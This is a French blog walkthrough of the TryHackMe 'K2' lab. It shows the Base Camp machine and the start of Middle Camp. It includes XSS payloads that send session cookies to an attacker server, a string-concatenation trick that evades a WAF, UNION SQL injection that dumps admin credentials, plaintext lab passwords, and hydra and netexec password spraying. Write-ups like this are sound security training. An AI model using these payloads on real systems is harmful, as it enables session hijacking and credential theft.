<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: K2</title>
<meta name=description content="Platforme: TryHackMe Lien: K2 Niveau: Difficile OS: Linux et Windows (Cette salle est composée de trois machines différentes) Base Camp Base Camp est une …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-k2/"><meta property="og:type" content="website"><meta property="og:title" content="THM: K2"><meta property="og:description" content="Platforme: TryHackMe Lien: K2 Niveau: Difficile OS: Linux et Windows (Cette salle est composée de trois machines différentes) Base Camp Base Camp est une …"><meta property="og:image" content="https://scorpiosec.com/images/THM-K2/K2.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-K2/K2.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: K2"><meta name=twitter:description content="Platforme: TryHackMe Lien: K2 Niveau: Difficile OS: Linux et Windows (Cette salle est composée de trois machines différentes) Base Camp Base Camp est une …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-k2/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-k2/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-K2/K2.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-k2/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-k2/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: K2</h1><small role=doc-subtitle></small><p class=post-date>17 min read |
<span class=post-date>24 Octobre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/r/room/k2room>K2</a></li><li>Niveau: Difficile</li><li>OS: Linux et Windows (Cette salle est composée de trois machines différentes)</li></ul><hr><h1 id=base-camp>Base Camp</h1><p>Base Camp est une machine Linux avec un serveur web. L&rsquo;énumération initiale révèle deux sous-domaines liés à un système de ticketing, dont l&rsquo;un est vulnérable au Cross-Site Scripting (XSS). En utilisant le XSS, nous dérobons un cookie de session pour accéder au tableau de bord de l&rsquo;administrateur, qui lui-même est vulnérable à l&rsquo;injection SQL. Cette faille nous permet de récupérer les informations d&rsquo;identification des administrateurs, ce qui nous confère un accès initial. Pour l&rsquo;escalade des privilèges, l&rsquo;appartenance au groupe <code>adm</code> permet de lire les logs du système, où nous découvrons le mot de passe root.</p><h2 id=balayage-base-camp>Balayage (Base Camp)</h2><p>Utilisez l&rsquo;adresse IP fournie et mettez à jour le fichier <code>/etc/hosts</code> avec <code>k2.thm</code>.</p><pre tabindex=0><code>./nmap_scan.sh k2.thm K2
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-09 13:00 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.81.60<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.21s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Dimension by HTML5 UP
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.15 seconds
</span></span></code></pre></div><p>Notre analyse révèle deux ports ouverts, 22 (SSH) et 80 (HTTP).</p><h2 id=what-is-the-user-flag>What is the user flag?</h2><h3 id=enumération>Enumération</h3><p>À l&rsquo;adresse <code>http://k2.thm</code>, nous trouvons le site web d&rsquo;une entreprise qui fournit des services informatiques.</p><p><img src=/images/THM-K2/k2_tryhackme_website.png alt="K2 base camp website"></p><p>Les différentes pages n&rsquo;offrent rien d&rsquo;exploitable et la page de contact renvoie une erreur <code>HTTP 405</code>.</p><p><img src=/images/THM-K2/HTTP-405.png alt="K2 base camp 405 error"></p><p>Le listing des répertoires ne contient aucune information utile.</p><pre tabindex=0><code>gobuster dir -u http://k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/gobuster_k2.png alt="K2 base camp gobuster cmd"></p><p>En revanche, nous découvrons deux sous-domaines différents avec ffuf.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://k2.thm -H &#34;Host: FUZZ.k2.thm&#34; -ic -fs 13229
</code></pre><p><img src=/images/THM-K2/k2_subdomains.png alt="K2 base camp subdomains"></p><p>Il existe une page de connexion pour un système de ticketing à l&rsquo;adresse <code>http://it.k2.thm/</code>.</p><p><img src=/images/THM-K2/k2_it_subdomain.png alt="K2 base camp IT domain"></p><p>Quelques répertoires sont trouvés par gobuster pour ce sous-domaine.</p><pre tabindex=0><code>gobuster dir -u http://it.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/it_subdomain_gobuster.png alt="IT subdomain hidden directories"></p><p>Le même système dispose d&rsquo;une page de connexion pour l&rsquo;administrateur à l&rsquo;adresse <code>http://admin.k2.thm/</code>.</p><p><img src=/images/THM-K2/k2_admin_subdomain.png alt="Admin subdomain"></p><p>Ce sous-domaine a les mêmes répertoires sauf le<code>register</code>.</p><pre tabindex=0><code>gobuster dir -u http://admin.k2.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/THM-K2/subdomain_admin_gobuster.png alt="Admin subdomain hidden directories"></p><p>Les tickets soumis à <code>http://it.k2.thm/</code> sont visibles à <code>http://admin.k2.thm/</code>.</p><p>Après la création d&rsquo;un compte, nous soumettons quelques tickets mais il nous manque les identifiants pour accéder à la page d&rsquo;administration. Puisque l&rsquo;application accepte les données de l&rsquo;utilisateur, testons les XSS.</p><p>Nous interceptons la requête après avoir soumis un ticket et la modifions. Nous utiliserons également deux payloads différents pour déterminer lequel des champs est vulnérable.</p><pre tabindex=0><code>&lt;script src=&#34;http://YOUR_IP:PORT_NUMBER/title.txt&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;http://YOUR_IP:PORT_NUMBER/description.txt&#34;&gt;&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/XSS_test.png alt="XSS test"></p><p>Après envoi de la requête, notre serveur web nous confirme que le champ <code>description</code> est vulnérable.</p><p><img src=/images/THM-K2/desc_vulneratble_XSS.png alt="XSS validated"></p><p>De plus, la requête contient un cookie de session et, après quelques recherches, nous apprenons que ni le drapeau <code>HttpOnly</code> ni le drapeau <code>Secure</code> ne sont activés sur ce cookie. Tous ces éléments indiquent la possibilité d&rsquo;un vol de cookie.</p><p><img src=/images/THM-K2/cookie_no_flags.png alt="Cookie with no secure flags"></p><p>Nous utiliserons la payload ci-dessous.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); i.src=&#34;http://IP:PORT/?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/cookie_stealing_XSS_payload.png alt="Cookie stealing via XSS"></p><p>Malheureusement pour nous, il est bloqué par le WAF (Web Application Firewall).</p><p><img src=/images/THM-K2/WAF_message.png alt="WAF message"></p><p>Après plusieurs tentatives, nous parvenons à contourner le WAF en utilisant la concaténation de chaînes.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); var c = &#34;do&#34; + &#34;cument&#34; + &#34;.&#34; + &#34;cookie&#34;; i.src=&#34;http://YOUR_IP:PORT_NUMBER/?cookie=&#34;+btoa(eval(c));&lt;/script&gt;
</code></pre><p><img src=/images/THM-K2/XSS_payload_bypass_WAF.png alt="WAF bypass payload"></p><p>Sur notre serveur web, nous recevons la valeur du cookie, que nous décodons avec la commande ci-dessous.</p><pre tabindex=0><code>echo &#34;CCOKIE_VALUE&#34; | base64 -d
</code></pre><p><img src=/images/THM-K2/cookie_value_base64.png alt="base64 cookie value"></p><p>Après l&rsquo;avoir utilisé sur le sous-domaine <code>admin</code> et avoir rafraîchi la page, nous avons maintenant accès au tableau de bord à <code>http://admin.k2.thm/dashboard</code> où nous trouvons trois tickets.</p><blockquote><p>Nous ne sommes pas automatiquement redirigés vers le tableau de bord de l&rsquo;administrateur et devons nous rendre nous-mêmes sur <code>http://admin.k2.thm/dashboard</code>.</p></blockquote><p><img src=/images/THM-K2/admin_dashboard_access.png alt="Admin dashboard access"></p><p>Nous pouvons filtrer les tickets sur la base du titre que nous fournissons. Il est raisonnable de supposer qu&rsquo;ils sont stockés dans une base de données. La prochaine étape consiste donc à tenter une injection SQL.</p><p>Nous interceptons la requête et ne remarquons qu&rsquo;un seul paramètre (<code>title</code>).</p><p><img src=/images/THM-K2/admin_dashboard_request.png alt="Admin dashboard request"></p><p>Le remplacement de la valeur de <code>title</code> par <code>'</code> (guillemet simple) entraîne une erreur 500, ce qui est souvent le signe d&rsquo;une possibilité d&rsquo;injection SQL.</p><p><img src=/images/THM-K2/k2_SQLi_test.png alt="SQLi test K2 basecamp"></p><p>Stockons la requête dans un fichier et utilisons-le avec SQLmap.</p><pre tabindex=0><code>sqlmap -r request.txt
</code></pre><p><img src=/images/THM-K2/sqli_blocked.png alt="SQLmap exploitation"></p><p>Une fois de plus, le WAF bloque notre exploitation, exactement comme il l&rsquo;a fait pour l&rsquo;attaque XSS. Il est probablement possible de contourner le problème avec SQLmap, mais c&rsquo;est au-dessus de mes compétences pour le moment. Cependant, nous pouvons essayer de l&rsquo;exploiter manuellement.</p><p>Nous disposons <a href=https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_SQLI.txt>ici</a> d&rsquo;une pléthore de payloads SQLi que nous pouvons utiliser avec la fonction <code>Intruder</code> de Burp Suite.</p><p><img src=/images/THM-K2/Intruder_burp.png alt="Burp Intruder SQLi"></p><p>Dans la sous-section <code>Payloads</code> nous collons la liste que nous avons obtenue de Github, et pour <code>Payload processing</code> nous utilisons <code>URL encoded all the characters</code>.</p><p><img src=/images/THM-K2/intruder_payload_settings.png alt="Burp Intruder SQLi settings"></p><p>Comme je m&rsquo;y attendais, ils sont tous bloqués par le WAF, encore une fois.</p><p><img src=/images/THM-K2/SQLi_payloads_blocked.png alt="SQLI payloads blocked with Intruder"></p><p>Jusqu&rsquo;à présent, nous avons utilisé des payloads SQLi simples/génériques. Reprenons à partir du <code>'</code> que nous avons utilisé plus tôt et partons de là. Cette fois-ci, nous allons tenter des attaques de type UNION.</p><p>Tout d&rsquo;abord, pour connaître le nombre de colonnes, nous allons envoyer quelques payloads avec <code>Intruder</code> et voir à quel moment nous n&rsquo;obtenons pas d&rsquo;erreur.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL; --
</span></span></span><span style=display:flex><span><span style=color:#98c379>&#39;</span> <span style=color:#c678dd>UNION</span> <span style=color:#c678dd>SELECT</span> <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>, <span style=color:#c678dd>NULL</span>; <span style=color:#7f848e>--
</span></span></span></code></pre></div><p><img src=/images/THM-K2/UNION_SQLi_payloads.png alt="Union SQLi payloads"></p><p>Après avoir exécuté notre attaque, nous constatons que <code>' UNION SELECT NULL, NULL, NULL ; --</code> fonctionne, ce qui signifie que trois colonnes sont escomptées.</p><p><img src=/images/THM-K2/UNION_SQLi_working_payload.png alt="Union SQLi successful payload"></p><p>Exécutons un test et essayons de trouver la version de la base de données.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, @@VERSION; --
</span></span></span></code></pre></div><p><img src=/images/THM-K2/SQLi_db_version.png alt="SQLi db version"></p><p>Nous réussissons et trouvons la version <code>8.0.33-0ubuntu0.20.04.2</code>. Ensuite, nous devons déterminer la base de données dans laquelle nous nous trouvons.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, NULL, database(); --
</span></span></span></code></pre></div><p>Nous sommes dans la base de données <code>Ticket Review</code>.</p><p><img src=/images/THM-K2/Ticket_review_db.png alt="Ticket review database"></p><p>Listons maintenant les noms de toutes les tables de cette base de données.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = database(); --
</span></span></span></code></pre></div><p>Nous découvrons trois tables! <code>admin_auth</code>, <code>auth_users</code>, et <code>tickets</code>.</p><p><img src=/images/THM-K2/tables_list_k2.png alt="Tables list in Ticket Reviiew DB"></p><p>Examinons le contenu de <code>admin_auth</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = &#39;</span><span style=color:#e06c75>admin_auth</span><span style=color:#98c379>&#39;; -- 
</span></span></span></code></pre></div><p>Nous trouvons quatre colonnes dans la table <code>admin_auth</code> qui sont : <code>id</code>, <code>admin_username</code>, <code>admin_password</code>, et <code>email</code>.</p><p><img src=/images/THM-K2/admin_auth_columns.png alt="admin_auth columns"></p><p>Nous pouvons maintenant récupérer les informations d&rsquo;identification avec <code>admin_username</code> et <code>admin_password</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#98c379>&#39; UNION SELECT NULL, admin_username, admin_password FROM admin_auth; --
</span></span></span></code></pre></div><p>Nous obtenons plusieurs identifiants d&rsquo;administrateur, les premiers étant : <code>james:Pwd@9tLNrC3!</code>.</p><pre tabindex=0><code>james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
</code></pre><p><img src=/images/THM-K2/SQLi_admin_creds.png alt="admin credentials"></p><h3 id=accès-initial-shell-en-tant-que-james>Accès initial (shell en tant que james)</h3><p>Avec <code>james:Pwd@9tLNrC3!</code> nous pouvons nous connecter via SSH et lire le drapeau utilisateur.</p><p><img src=/images/THM-K2/user_flag_basecamp_k2.png alt="user flag for K2-basecamp"></p><h2 id=what-is-the-root-flag>What is the root flag?</h2><p>Nos tentatives de connexion avec les autres identifiants échouent. Après avoir lancé <code>id</code>, nous remarquons que <code>james</code> fait partie du groupe <code>adm</code>.</p><p><img src=/images/THM-K2/adm_group.png alt="adm group membership"></p><p>Sur cette <a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#lxc-lxd-group>page HackTricks</a>, nous apprenons que les membres du groupe <code>adm</code> ont généralement les permissions pour lire les fichiers log situés dans /var/log/.</p><p><img src=/images/THM-K2/adm_group_info.png alt="adm group info"></p><p>Pour analyser cette montagne de données, nous utilisons une commande grep.</p><pre tabindex=0><code>grep -ir &#34;password&#34;
</code></pre><p>Dans <code>nginx/access.log.1</code> nous trouvons une tentative de connexion de l&rsquo;utilisateur <code>rose</code> avec le mot de passe <code>RdzQ7MSKt)fNaz3!</code>.</p><p><img src=/images/THM-K2/rose_pwd.png alt="Rose password"></p><p>Mais l&rsquo;utilisation de ce mot de passe avec <code>su rose</code> échoue!</p><p><img src=/images/THM-K2/su_rose_failure.png alt="switch to user rose failure"></p><h3 id=elévation-de-privilèges>Elévation de Privilèges</h3><p>Essayons ce mot de passe avec tous les utilisateurs du système.</p><pre tabindex=0><code>hydra -L k2_users.txt -p &#39;RdzQ7MSKt)fNaz3!&#39; ssh://k2.thm
</code></pre><p>Il s&rsquo;avère que ce mot de passe appartient au compte root.</p><p><img src=/images/THM-K2/ssh_root_creds.png alt="root account credentials"></p><p>Avec <code>root:RdzQ7MSKt)fNaz3!</code> nous nous connectons via SSH et récupérons le drapeau root.</p><p><img src=/images/THM-K2/root_flag_basecamp_k2.png alt="root flag for K2-basecamp"></p><h2 id=what-are-the-usernames-and-passwords-that-had-access-to-the-server>What are the usernames and passwords that had access to the server?</h2><p>Les noms d&rsquo;utilisateurs que nous avons trouvés dans <code>/etc/passwd</code> et leurs mots de passe respectifs sont ci-dessous.</p><pre tabindex=0><code>james:Pwd@9tLNrC3!,root:RdzQ7MSKt)fNaz3!,rose:vRMkaVgdfxhW!8
</code></pre><h2 id=two-users-have-their-full-names-on-display-what-are-their-names>Two users have their full names on display. What are their names?</h2><p>Avec <code>/etc/passwd</code></p><p><img src=/images/THM-K2/users_full_names.png alt="users full names"></p><p><code>James Bold, Rose Bud</code>.</p><p>Nous pouvons maintenant passer à la machine suivante, Middle Camp.</p><h1 id=middle-camp>Middle Camp</h1><p>Middle Camp est un contrôleur de domaine sans serveur web. En utilisant les données de la machine précédente, nous accédons au système via RPC. Sur la cible, il y a une note qui révèle partiellement le mot de passe d&rsquo;un utilisateur, en utilisant un script Bash, nous récupérons le mot de passe complet. Avec Bloodhound, nous identifions un groupe avec des permissions <code>GenericAll</code> sur un autre compte, ce qui nous permet de changer le mot de passe de ce compte et de nous déplacer latéralement. Le nouvel utilisateur, membre de <code>Backup Operators</code>, nous permet de lire le drapeau root, et nous utilisons <code>SeBackupPrivilege</code> pour accéder aux ruches du registre afin de récupérer le hash de l&rsquo;administrateur.</p><h2 id=balayage-middle-camp>Balayage (Middle Camp)</h2><p>Mettez à jour le fichier <code>/etc/hosts</code> avec l&rsquo;adresse IP de la nouvelle machine pour <code>k2.thm</code>, et scannez-la.</p><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/k2_MC k2.thm
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-16 11:38 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.70.233<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-10-16 16:38:36Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>|_ssl-date: 2024-10-16T16:39:27+00:00; 0s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>K2Server.k2.thm
</span></span><span style=display:flex><span>| Not valid before: 2024-10-15T16:07:29
</span></span><span style=display:flex><span>|_Not valid after:  2025-04-16T16:07:29
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: K2SERVER
</span></span><span style=display:flex><span>|   DNS_Domain_Name: k2.thm
</span></span><span style=display:flex><span>|   DNS_Computer_Name: K2Server.k2.thm
</span></span><span style=display:flex><span>|   DNS_Tree_Name: k2.thm
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-10-16T16:38:47+00:00
</span></span><span style=display:flex><span>Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-10-16T16:38:50
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 77.21 seconds
</span></span></code></pre></div><p>Nous avons cette fois affaire à un contrôleur de domaine et il n&rsquo;y a pas de serveur web.</p><p>Nous notons le nom de l&rsquo;ordinateur <code>K2Server.k2.thm</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</p><h2 id=what-is-the-user-flag-1>What is the user flag?</h2><h3 id=enumération-1>Enumération</h3><p>Grâce l&rsquo;exploitation de la machine précédente, nous savons que les utilisateurs ayant accès au serveur sont <code>James Bold</code> et <code>Rose Bud</code>. Puisque nous sommes dans un environnement AD (Active Directory), essayons de trouver des noms d&rsquo;utilisateur de domaine valides. Ils suivent généralement un certain schéma, voici donc une liste de noms d&rsquo;utilisateur AD possibles.</p><pre tabindex=0><code>James
Rose
James Bold
Rose Bud
j.bold
james.bold
bold.j
r.bud
rose.bud
bud.r
</code></pre><blockquote><p>Il est facile de créer des combinaisons pour deux utilisateurs. Si vous en avez plus, vous pouvez utiliser un outil comme <a href=https://github.com/urbanadventurer/username-anarchy>username-anarchy</a>.</p></blockquote><p>Nous créons également une liste de tous les mots de passe dont nous disposons actuellement.</p><pre tabindex=0><code>Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
</code></pre><h4 id=méthode-netexec>Méthode NetExec</h4><p>Avec la liste des utilisateurs potentiels et la liste des mots de passe de la machine précédente, nous pouvons énumérer les utilisateurs.</p><pre tabindex=0><code>netexec smb K2Server.k2.thm -u potential_AD_users.txt -p found_pwds.txt
